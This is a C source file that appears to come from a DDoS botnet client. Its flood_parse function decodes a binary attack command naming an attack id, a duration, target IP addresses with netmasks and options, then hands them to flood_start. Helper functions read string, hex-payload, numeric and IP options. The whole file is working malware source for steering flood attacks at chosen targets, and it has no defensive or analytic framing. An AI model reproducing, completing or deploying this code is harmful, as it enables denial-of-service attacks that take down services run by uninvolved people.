#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>

#include "../../utils/headers/includes.h"
#include "../../utils/headers/rand.h"
#include "../../utils/headers/util.h"
#include "attack.h"
#include "../debug.h"

void flood_parse(char *buf, int buf_len)
{

    debug("Received %d bytes.\n", buf_len);

    int x = 0;

    uint8_t id, num_of_targets, num_of_options = 0;
    uint16_t time;

    struct flood_target *target = NULL;
    struct flood_flag *opts = NULL;

    id = *(uint8_t *)buf;
    buf += sizeof(uint8_t);
    buf_len -= sizeof(uint8_t);

    time = *(uint16_t *)buf;
    time = ntohs(time);
    buf += sizeof(uint16_t);
    buf_len -= sizeof(uint16_t);

    num_of_targets = *(uint8_t *)buf;
    buf += sizeof(uint8_t);
    buf_len -= sizeof(uint8_t);

    target = (struct flood_target *)calloc(num_of_targets, sizeof(struct flood_target));
    if (!target)
        return;

    for (x = 0; x < num_of_targets; x++)
    {
        target[x].addr = *((uint32_t *)buf);
        buf += sizeof(uint32_t);
        target[x].netmask = (uint8_t)*buf++;
        buf_len -= (sizeof(uint32_t) + sizeof(uint8_t));

        target[x].sock_addr.sin_family = AF_INET;
        target[x].sock_addr.sin_addr.s_addr = target[x].addr;
        debug("Parsed Target: %d.%d.%d.%d/%d\n", target[x].addr & 0xff, (target[x].addr >> 8) & 0xff, (target[x].addr >> 16) & 0xff, (target[x].addr >> 24) & 0xff, target[x].netmask);
    }

    num_of_options = *(uint8_t *)buf;
    buf += sizeof(uint8_t);
    buf_len -= sizeof(uint8_t);

    if (num_of_options > 0)
    {
        opts = (struct flood_flag *)calloc(num_of_options, sizeof(struct flood_flag));
        if (!opts)
        {
            free(target);
            return;
        }

        for (x = 0; x < num_of_options; x++)
        {
            uint8_t val_len = 0;

            opts[x].id = *(uint8_t *)buf;
            buf += sizeof(uint8_t);
            buf_len -= sizeof(uint8_t);

            val_len = *(uint8_t *)buf;
            buf += sizeof(uint8_t);
            buf_len -= sizeof(uint8_t);

            opts[x].val = calloc(val_len + 1, sizeof (char));
            _memcpy(opts[x].val, buf, val_len);

            buf += val_len;
            buf_len -= val_len;
        }
    }

    flood_start(id, opts, num_of_options, target, num_of_targets, time);
}

char *get_option_string(uint8_t opts_len, struct flood_flag *opts, uint8_t opt, char *def)
{
    int i;

    for (i = 0; i < opts_len; i++)
    {
        if (opts[i].id == opt)
            return opts[i].val;
    }

    return def;
}

char *get_option_hex_string(uint8_t opts_len, struct flood_flag *opts, uint8_t opt, char *def)
{
    int i;

    for (i = 0; i < opts_len; i++)
    {
        if (opts[i].id == opt)
        {
            char *hexxedPayload = hex_to_text(opts[i].val);
            opts[i].val = hexxedPayload;
            return opts[i].val;
        }
    }

    return def;
}

int get_option_number(uint8_t opts_len, struct flood_flag *opts, uint8_t opt, int def)
{
    char *val = get_option_string(opts_len, opts, opt, NULL);

    if (val == NULL)
        return def;
    else
        return _atoi(val);
}

uint32_t get_option_ip(uint8_t opts_len, struct flood_flag *opts, uint8_t opt, uint32_t def)
{
    char *val = get_option_string(opts_len, opts, opt, NULL);

    if (val == NULL)
        return def;
    else
        return inet_addr(val);
}
